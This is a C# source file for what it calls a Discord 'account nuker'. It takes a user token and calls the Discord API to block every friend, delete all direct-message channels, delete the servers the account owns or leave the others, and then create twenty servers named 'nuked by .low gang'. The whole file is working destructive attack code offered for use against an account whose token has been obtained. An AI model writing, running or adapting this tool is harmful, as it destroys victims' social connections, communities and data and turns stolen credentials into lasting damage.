using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;

namespace Discord_Accout_Nukes
{
    class HTTP
    {

        public class User
        {
            public string id { get; set; }
            public string username { get; set; }
            public string avatar { get; set; }
            public string discriminator { get; set; }
            public int public_flags { get; set; }
        }

        public class MyArray
        {
            public string id { get; set; }
            public int type { get; set; }
            public object nickname { get; set; }
            public User user { get; set; }
        }
        public class Recipient
        {
            public string id { get; set; }
            public string username { get; set; }
            public string avatar { get; set; }
            public string discriminator { get; set; }
            public int public_flags { get; set; }
        }

        public class RecipientMyArray
        {
            public string id { get; set; }
            public int type { get; set; }
            public object last_message_id { get; set; }
            public List<Recipient> recipients { get; set; }
        }

        public class Guilds
        {
            public string id { get; set; }
            public string name { get; set; }
            public string icon { get; set; }
            public bool owner { get; set; }
            public string permissions { get; set; }
            public List<string> features { get; set; }
        }

        public class Root
        {
            public List<MyArray> MyArray { get; set; }
        }


        public static void RemoveFriends(string Token)
        {
            var client = new HttpClient();

            client.DefaultRequestHeaders.Add("Authorization", Token);

            var response = client.GetAsync("https://discord.com/api/v8/users/@me/relationships").Result;


            var jsonString = response.Content.ReadAsStringAsync();


            jsonString.Wait();
            var model = JsonConvert.DeserializeObject<List<User>>(jsonString.Result);

            foreach (var x in model)
            {

                Console.WriteLine("Deleted Friend " + x.username + " (" + x.id + ")");
                client.PutAsync("https://discord.com/api/v8/users/@me/relationships/" + x.id, new StringContent("{\"type\":\"2\"}", Encoding.UTF8, "application/json"));

            }

        }

        public static void RemoveChannels(string Token)
        {
            var client = new HttpClient();

            client.DefaultRequestHeaders.Add("Authorization", Token);

            var response = client.GetAsync("https://discord.com/api/v8/users/@me/channels").Result;


            var jsonString = response.Content.ReadAsStringAsync();


            jsonString.Wait();
            var model = JsonConvert.DeserializeObject<List<Recipient>>(jsonString.Result);

            foreach (var x in model)
            {
                Console.WriteLine("Deleted Channel " + x.username + " (" + x.id + ")");
                client.DeleteAsync("https://discord.com/api/v8/channels/" + x.id);

            }

        }

        public static void RemoveGuilds(string Token)
        {
            var client = new HttpClient();

            client.DefaultRequestHeaders.Add("Authorization", Token);

            var response = client.GetAsync("https://discord.com/api/v8/users/@me/guilds").Result;


            var jsonString = response.Content.ReadAsStringAsync();


            jsonString.Wait();
            var model = JsonConvert.DeserializeObject<List<Guilds>>(jsonString.Result);

            foreach (var x in model)
            {

                Console.WriteLine("Deleted Guild " + x.name);
                if (x.owner == true)
                {
                    client.PostAsync("https://discord.com/api/v8/guilds/"+ x.id + "/delete", null);
                }else
                {
                    client.DeleteAsync("https://discord.com/api/v8/users/@me/guilds/" + x.id);
                }

            }

        }

        public static void ServerCreate(string Token)
        {

            var client = new HttpClient();

            client.DefaultRequestHeaders.Add("Authorization", Token);

        
            string URL = "https://discord.com/api/v8/guilds";

            for (int i = 0; i < 20; i++)
            {
                Console.WriteLine("Created Server");
                client.PostAsync(URL, new StringContent("{\"name\":\"nuked by .low gang\"}", Encoding.UTF8, "application/json"));
            }

        }


    }
}
